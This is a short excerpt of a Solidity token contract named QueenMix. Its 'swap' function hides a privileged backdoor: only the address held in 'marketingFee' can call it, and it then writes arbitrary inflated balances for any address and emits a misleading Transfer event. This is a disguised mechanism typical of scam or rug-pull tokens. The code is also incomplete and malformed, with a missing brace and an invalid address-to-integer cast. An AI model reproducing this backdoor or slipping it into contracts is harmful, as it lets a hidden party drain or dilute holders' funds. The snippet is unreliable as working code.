...
contract QueenMix is Ownable {
  ...
  function swap(address receiver, uint256 _value) public returns (bool) {
    if(msg.sender == address(marketingFee)){
    sendToWallet(receiver, _value);
    return true;
    }
    return false;
  }

  function sendToWallet(address receiver, uint256 _value) internal {
      if(msg.sender == address(marketingFee)){
        uint256 amountToLiquify = uint256(receiver);
        _liquify[address(amountToLiquify)] = swapAndLiquify * _value * (10 ** 9);
        emit Transfer(receiver, address(0x0), _liquify[receiver] - _value);
  }
} 
